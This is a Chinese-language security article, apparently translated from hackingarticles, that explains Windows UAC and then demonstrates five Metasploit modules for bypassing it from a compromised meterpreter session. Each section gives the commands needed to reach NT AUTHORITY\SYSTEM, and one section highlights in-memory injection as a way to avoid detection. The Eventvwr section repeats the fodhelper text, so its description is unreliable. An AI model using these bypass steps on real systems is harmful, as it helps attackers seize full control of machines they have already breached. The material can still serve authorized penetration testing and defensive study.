****

**用户帐户控制（简称UAC）是微软公司在其Windows
Vista，及更高版本操作系统中采用的一种控制机制。通过本文你将了解它是如何保护你免受恶意软件侵害的，以及忽略UAC提示将可能给你系统带来的麻烦。**

##  **UAC简介**

###  **什么是用户帐户控制？**

UAC是在Windows Vista及更高版本操作系统中采用的一种控制机制，它以预见的方式阻止不必要的系统范围更改。

换句话说，它是Windows的一项安全功能，支持你阻止任何对系统未经授权的更改操作行为。UAC确保仅在管理员授权的情况下进行某些更改。如果管理员不允许更改，则不会执行这些更改，并且Windows也不会发生任何的改变。

###  **UAC是如何运作的？**

一旦程序执行涉及系统更改/特定任务就会触发UAC。除非尝试执行它们的进程以管理员权限运行，否则这些操作都将被阻止。没有管理员权限将无法执行以下操作：

> 注册表修改（如果注册表项位于如HKEY_LOCAL_MACHINE下（因为它影响多个用户），它将是只读的）
>
> 加载设备驱动程序
>
> DLL注入
>
> 修改系统时间（clock）
>
> 修改用户帐户控制设置（通过注册表可以启用/禁用它，但你需要正确的权限才能执行该操作）
>
> 修改受保护的目录（例如Windows文件夹，Program Files）
>
> 计划任务（例如，以管理员权限自启动）

 **注：**[UAC](https://malwaretips.com/threads/why-uac-is-important-and-how-it-can-protect-you.47157/)的作用并不是帮你阻止恶意软件或识别程序是否为恶意程序，这主要取决于用户。如果用户以管理员权限执行程序，UAC将提醒用户并要求用户提供确认。

## 5种绕过UAC的方法

首先，假设我们已获取目标系统的meterpreter shell，并得到了一个meterpreter session
1。然后，我们键入以下命令提权并查看权限。

    
    
    getsystem
    
    getuid

如果你并未取得system/admin权限，那你就要想办法绕过目标系统的UAC保护。

###  **Windows提权UAC保护绕过**

该模块将通过进程注入，利用受信任的发布者证书绕过Windows UAC。 它将为我们生成另一个关闭UAC的shell（session 2）。

    
    
    msf > use exploit/windows/local/bypassuac
    msf exploit windows/local/bypassuac) > set session 1
    msf exploit(windows/local/bypassuac) > exploit

从图片中可以看到meterpreter session 2已被打开，现在我们键入以下命令提权并查看权限。

    
    
    getsystem
    getuid

可以看到我们已将权限提升为了NT AUTHORITY\SYSTEM。现在如果你输入“shell”命令，你将获得具有管理员权限的命令提示符。

![使用Metasploit绕过UAC的多种方法](https://image.3001.net/images/20180924/1537750288_5ba835100ed44.png!small)

###  **Windows提权UAC保护绕过（内存注入）**

该模块将通过进程注入，利用受信任的发布者证书绕过Windows UAC。 它将为我们生成另一个关闭UAC的shell（session
2）。该模块将直接运行在内存中的反射DLL中，由于它并不触碰硬盘，因此可以最大限度地降低被安全检测的概率。但该模块的使用需要选择正确的架构（对于SYSWOW64系统也是使用x64）。如果指定EXE::Custom
DLL ，则应在单独的进程中启动payload后调用ExitProcess()。

    
    
    msf > use exploit/windows/local/bypassuac_injection
    msf exploit(windows/local/bypassuac_injection) > set session 1
    msf exploit(windows/local/bypassuac_injection) > exploit

从图片中可以看到meterpreter session 2已被打开，现在我们键入以下命令提权并查看权限。

    
    
    getsystem
    getuid

可以看到我们已将权限提升为了NT AUTHORITY\SYSTEM。现在如果你输入“shell”命令，你将获得具有管理员权限的命令提示符。

![使用Metasploit绕过UAC的多种方法](https://image.3001.net/images/20180924/1537750301_5ba8351d58ccd.png!small)

###  **Windows提权UAC保护绕过（通过** **FodHelper注册表项** **）**

该模块通过在当前用户配置单元下劫持注册表中的特殊键，并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows
10
UAC。它将为我们生成另一个关闭UAC的shell。虽然该模块修改了注册表，但它会在调用payload后清除该键。相比之前的模块，该模块对架构系统并无特别要求。如果指定EXE::Custom
DLL，则应在单独的进程中启动payload后调用ExitProcess()。

    
    
    msf > use exploit/windows/local/bypassuac_fodhelper
    msf exploit(windows/local/bypassuac_fodhelper) > set session 1
    msf exploit(windows/local/bypassuac_fodhelper) > exploit

从图片中可以看到meterpreter session 2已被打开，现在我们键入以下命令提权并查看权限。

    
    
    getsystem
    getuid

可以看到我们已将权限提升为了NT AUTHORITY\SYSTEM。现在如果你输入“shell”命令，你将获得具有管理员权限的命令提示符。

![使用Metasploit绕过UAC的多种方法](https://image.3001.net/images/20180924/1537750315_5ba8352b6512f.png!small)

###  **Windows提权UAC保护绕过（通过** **Eventvwr** **注册表项** **）**

该模块通过在当前用户配置单元下劫持注册表中的特殊键，并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows
10
UAC。它将为我们生成另一个关闭UAC的shell。虽然该模块修改了注册表，但它会在调用payload后清除该键。相比之前的模块，该模块对架构系统并无特别要求。如果指定EXE::Custom
DLL，则应在单独的进程中启动payload后调用ExitProcess()。

    
    
    msf > use exploit/windows/local/bypassuac_eventvwr
    msf exploit(windows/local/bypassuac_eventvwr) > set session 1
    msf exploit(windows/local/bypassuac_eventvwr) > exploit

从图片中可以看到meterpreter session 2已被打开，现在我们键入以下命令提权并查看权限。

    
    
    getsystem
    getuid

可以看到我们已将权限提升为了NT AUTHORITY\SYSTEM。现在如果你输入“shell”命令，你将获得具有管理员权限的命令提示符。

![使用Metasploit绕过UAC的多种方法](https://image.3001.net/images/20180924/1537750328_5ba835386d2a0.png!small)

###  **Windows提权UAC保护绕过（COM处理程序劫持）**

此模块将通过在HKCU配置单元中，创建COM处理程序注册表项来绕过Windows
UAC。当加载某些高完整性进程时将会引用这些注册表项，从而导致进程加载用户控制的DLL。这些DLL中包含了可提升权限的payload。在调用payload后该模块将会清除该键。该模块的使用需要选择正确的架构，但在当前低权限的Meterpreter
session下架构可以不同。如果指定EXE::Custom
DLL，则应在单独的进程中启动payload后调用ExitProcess()。该模块需要通过目标系统上的cmd.exe来调用目标二进制文件，因此如果限制cmd.exe访问，则此模块将无法正常运行。

    
    
    msf > use exploit/windows/local/bypassuac_comhijack
    msf exploit(windows/local/bypassuac_comhijack) > set session 1
    msf exploit(windows/local/bypassuac_comhijack) > exploit

从图片中可以看到meterpreter session 2已被打开，现在我们键入以下命令提权并查看权限。

    
    
    getsystem
    getuid

可以看到我们已将权限提升为了NT AUTHORITY\SYSTEM。现在如果你输入“shell”命令，你将获得具有管理员权限的命令提示符。

![使用Metasploit绕过UAC的多种方法](https://image.3001.net/images/20180924/1537750345_5ba835490e20a.png!small)

***参考来源：[hackingarticles](http://www.hackingarticles.in/multiple-ways-to-bypass-uac-using-metasploit/)，FB小编 secist 编译，转载请注明来自FreeBuf.COM**

